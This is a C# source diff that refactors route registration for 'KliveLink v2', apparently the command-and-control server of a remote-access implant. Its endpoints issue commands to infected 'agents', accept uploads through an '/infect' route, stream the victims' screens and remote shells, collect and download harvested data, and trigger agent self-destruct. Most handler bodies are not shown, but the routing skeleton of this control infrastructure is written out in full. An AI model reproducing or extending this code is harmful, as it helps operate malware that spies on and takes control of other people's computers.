@@ -1,4 +1,4 @@
-﻿using System.Net;
+using System.Net;
 using System.Net.WebSockets;
 using System.Text;
 using System.Text.Json;
@@ -13,12 +13,38 @@ namespace Omnipotent.Services.KliveLink;
 public sealed class KliveLinkV2Routes
 {
     private readonly KliveLinkV2Service _parent;
+    private readonly Omnipotent.Services.KliveAPI.KliveAPI? _injectedApi;
+    private Omnipotent.Services.KliveAPI.KliveAPI? _api;
 
-    public KliveLinkV2Routes(KliveLinkV2Service parent) => _parent = parent;
+    public KliveLinkV2Routes(KliveLinkV2Service parent, Omnipotent.Services.KliveAPI.KliveAPI? api = null)
+    {
+        _parent = parent;
+        _injectedApi = api;
+    }
+
+    private async Task<Omnipotent.Services.KliveAPI.KliveAPI> ResolveApiAsync()
+    {
+        if (_api != null) return _api;
+        if (_injectedApi != null) return _api = _injectedApi;
+
+        var direct = _parent.InjectedApi ?? _parent.GetActiveServices().OfType<Omnipotent.Services.KliveAPI.KliveAPI>().FirstOrDefault();
+        if (direct != null) return _api = direct;
+
+        var deadline = DateTime.UtcNow.AddSeconds(45);
+        while (DateTime.UtcNow < deadline)
+        {
+            direct = _parent.InjectedApi ?? _parent.GetActiveServices().OfType<Omnipotent.Services.KliveAPI.KliveAPI>().FirstOrDefault();
+            if (direct != null) return _api = direct;
+            await Task.Delay(100);
+        }
+        throw new InvalidOperationException("KliveAPI did not become available in time for KliveLink v2 route registration.");
+    }
 
     public async Task CreateRoutes()
     {
-        await _parent.CreateAPIRoute("/klivelink/v2/agents", async req =>
+        var api = await ResolveApiAsync();
+
+        await api.CreateRoute("/klivelink/v2/agents", async req =>
         {
             try
             {
@@ -47,7 +73,7 @@ public sealed class KliveLinkV2Routes
             }
         }, HttpMethod.Get, KliveLinkPerms.AgentsView);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/agents/detail", async req =>
+        await api.CreateRoute("/klivelink/v2/agents/detail", async req =>
         {
             try
             {
@@ -78,7 +104,7 @@ public sealed class KliveLinkV2Routes
             }
         }, HttpMethod.Get, KliveLinkPerms.AgentsView);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/agents/command", async req =>
+        await api.CreateRoute("/klivelink/v2/agents/command", async req =>
         {
             try
             {
@@ -103,7 +129,7 @@ public sealed class KliveLinkV2Routes
             }
         }, HttpMethod.Post, KliveLinkPerms.AgentsControl);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/agents/data-summary", async req =>
+        await api.CreateRoute("/klivelink/v2/agents/data-summary", async req =>
         {
             try
             {
@@ -117,7 +143,7 @@ public sealed class KliveLinkV2Routes
             }
         }, HttpMethod.Get, KliveLinkPerms.AgentsView);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/agents/purge", async req =>
+        await api.CreateRoute("/klivelink/v2/agents/purge", async req =>
         {
             try
             {
@@ -136,7 +162,7 @@ public sealed class KliveLinkV2Routes
             }
         }, HttpMethod.Post, KliveLinkPerms.AgentsPurge);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/agents/purge/status", async req =>
+        await api.CreateRoute("/klivelink/v2/agents/purge/status", async req =>
         {
             try
             {
@@ -152,7 +178,7 @@ public sealed class KliveLinkV2Routes
             }
         }, HttpMethod.Get, KliveLinkPerms.AgentsPurge);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/collection/snapshots", async req =>
+        await api.CreateRoute("/klivelink/v2/collection/snapshots", async req =>
         {
             try
             {
@@ -166,7 +192,7 @@ public sealed class KliveLinkV2Routes
             }
         }, HttpMethod.Get, KliveLinkPerms.CollectionView);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/collection/records", async req =>
+        await api.CreateRoute("/klivelink/v2/collection/records", async req =>
         {
             try
             {
@@ -182,7 +208,7 @@ public sealed class KliveLinkV2Routes
             }
         }, HttpMethod.Get, KliveLinkPerms.CollectionSearch);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/collection/record", async req =>
+        await api.CreateRoute("/klivelink/v2/collection/record", async req =>
         {
             try
             {
@@ -201,7 +227,7 @@ public sealed class KliveLinkV2Routes
             }
         }, HttpMethod.Get, KliveLinkPerms.CollectionDownload);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/collection/download", async req =>
+        await api.CreateRoute("/klivelink/v2/collection/download", async req =>
         {
             try
             {
@@ -227,7 +253,7 @@ public sealed class KliveLinkV2Routes
             }
         }, HttpMethod.Get, KliveLinkPerms.CollectionDownload);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/collection/start", async req =>
+        await api.CreateRoute("/klivelink/v2/collection/start", async req =>
         {
             try
             {
@@ -253,7 +279,7 @@ public sealed class KliveLinkV2Routes
             }
         }, HttpMethod.Post, KliveLinkPerms.CollectionManage);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/audit", async req =>
+        await api.CreateRoute("/klivelink/v2/audit", async req =>
         {
             try
             {
@@ -267,7 +293,7 @@ public sealed class KliveLinkV2Routes
             }
         }, HttpMethod.Get, KliveLinkPerms.AuditView);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/updates/current", async req =>
+        await api.CreateRoute("/klivelink/v2/updates/current", async req =>
         {
             try
             {
@@ -277,7 +303,7 @@ public sealed class KliveLinkV2Routes
             catch (Exception ex) { await Fail(req, ex); }
         }, HttpMethod.Get, KliveLinkPerms.AgentsView);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/updates", async req =>
+        await api.CreateRoute("/klivelink/v2/updates", async req =>
         {
             try
             {
@@ -291,7 +317,7 @@ public sealed class KliveLinkV2Routes
             catch (Exception ex) { await Fail(req, ex); }
         }, HttpMethod.Post, KliveLinkPerms.AgentsControl);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/agents/update", async req =>
+        await api.CreateRoute("/klivelink/v2/agents/update", async req =>
         {
             try
             {
@@ -308,7 +334,7 @@ public sealed class KliveLinkV2Routes
             catch (Exception ex) { await Fail(req, ex); }
         }, HttpMethod.Post, KliveLinkPerms.AgentsControl);
 
-        await _parent.CreateBufferedAPIRoute("/klivelink/v2/infect", async req =>
+        await api.CreateBufferedRoute("/klivelink/v2/infect", async req =>
         {
             try
             {
@@ -360,7 +386,7 @@ public sealed class KliveLinkV2Routes
             catch (Exception ex) { await Fail(req, ex); }
         }, HttpMethod.Post, KliveLinkPerms.Infect, 250L * 1024 * 1024);
 
-        await _parent.CreateAPIRoute("/k", async req =>
+        await api.CreateRoute("/k", async req =>
         {
             try
             {
@@ -376,7 +402,7 @@ public sealed class KliveLinkV2Routes
             catch (Exception ex) { await Fail(req, ex); }
         }, HttpMethod.Get, Perms.Public);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/download", async req =>
+        await api.CreateRoute("/klivelink/v2/download", async req =>
         {
             try
             {
@@ -392,7 +418,7 @@ public sealed class KliveLinkV2Routes
             catch (Exception ex) { await Fail(req, ex); }
         }, HttpMethod.Get, Perms.Public);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/health", async req =>
+        await api.CreateRoute("/klivelink/v2/health", async req =>
         {
             try
             {
@@ -412,7 +438,7 @@ public sealed class KliveLinkV2Routes
             }
         }, HttpMethod.Get, KliveLinkPerms.AgentsView);
 
-        await _parent.CreateAPIRoute("/klivelink/v2/agents/selfdestruct", async req =>
+        await api.CreateRoute("/klivelink/v2/agents/selfdestruct", async req =>
         {
             try
             {
@@ -428,18 +454,18 @@ public sealed class KliveLinkV2Routes
             }
         }, HttpMethod.Post, KliveLinkPerms.AgentsDestroy);
 
-        await _parent.ExecuteServiceMethod<Omnipotent.Services.KliveAPI.KliveAPI>("CreateAgentWebSocketRoute",
+        await api.CreateAgentWebSocketRoute(
             "/klivelink/v2/ws",
-            (Func<HttpListenerContext, WebSocket, System.Collections.Specialized.NameValueCollection, KMProfileManager.KMProfile?, Task>)(async (context, socket, query, user) =>
+            async (context, socket, query, user) =>
             {
                 string agentId = context.Request.Headers["X-Agent-Id"] ?? "";
                 string token = context.Request.Headers["X-Enrollment-Token"] ?? "";
                 await _parent.Server.HandleAgentSocketAsync(socket, agentId, token);
-            }));
+            });
 
-        await _parent.ExecuteServiceMethod<Omnipotent.Services.KliveAPI.KliveAPI>("CreateWebSocketRoute",
+        await api.CreateWebSocketRoute(
             "/klivelink/v2/events",
-            (Func<HttpListenerContext, WebSocket, System.Collections.Specialized.NameValueCollection, KMProfileManager.KMProfile?, Task>)(async (context, socket, query, user) =>
+            async (context, socket, query, user) =>
             {
                 string viewerId = _parent.Server.AddEventViewer(socket);
                 try
@@ -460,11 +486,11 @@ public sealed class KliveLinkV2Routes
                         try { await socket.CloseAsync(WebSocketCloseStatus.NormalClosure, "events ended", CancellationToken.None); } catch { }
                     }
                 }
-            }), KliveLinkPerms.AgentsView);
+            }, KliveLinkPerms.AgentsView);
 
-        await _parent.ExecuteServiceMethod<Omnipotent.Services.KliveAPI.KliveAPI>("CreateWebSocketRoute",
+        await api.CreateWebSocketRoute(
             "/klivelink/v2/agents/screen/stream",
-            (Func<HttpListenerContext, WebSocket, System.Collections.Specialized.NameValueCollection, KMProfileManager.KMProfile?, Task>)(async (context, socket, query, user) =>
+            async (context, socket, query, user) =>
             {
                 string? agentId = query.Get("agentId");
                 if (string.IsNullOrWhiteSpace(agentId) || socket.State != WebSocketState.Open)
@@ -498,11 +524,11 @@ public sealed class KliveLinkV2Routes
                         try { await socket.CloseAsync(WebSocketCloseStatus.NormalClosure, "stream ended", CancellationToken.None); } catch { }
                     }
                 }
-            }), KliveLinkPerms.AgentsControl);
+            }, KliveLinkPerms.AgentsControl);
 
-        await _parent.ExecuteServiceMethod<Omnipotent.Services.KliveAPI.KliveAPI>("CreateWebSocketRoute",
+        await api.CreateWebSocketRoute(
             "/klivelink/v2/agents/shell/stream",
-            (Func<HttpListenerContext, WebSocket, System.Collections.Specialized.NameValueCollection, KMProfileManager.KMProfile?, Task>)(async (context, socket, query, user) =>
+            async (context, socket, query, user) =>
             {
                 string? agentId = query.Get("agentId");
                 if (string.IsNullOrWhiteSpace(agentId) || socket.State != WebSocketState.Open)
@@ -546,7 +572,7 @@ public sealed class KliveLinkV2Routes
                         try { await socket.CloseAsync(WebSocketCloseStatus.NormalClosure, "shell ended", CancellationToken.None); } catch { }
                     }
                 }
-            }), KliveLinkPerms.AgentsControl);
+            }, KliveLinkPerms.AgentsControl);
 
         await _parent.LogAsync("KliveLink v2 routes created.");
     }
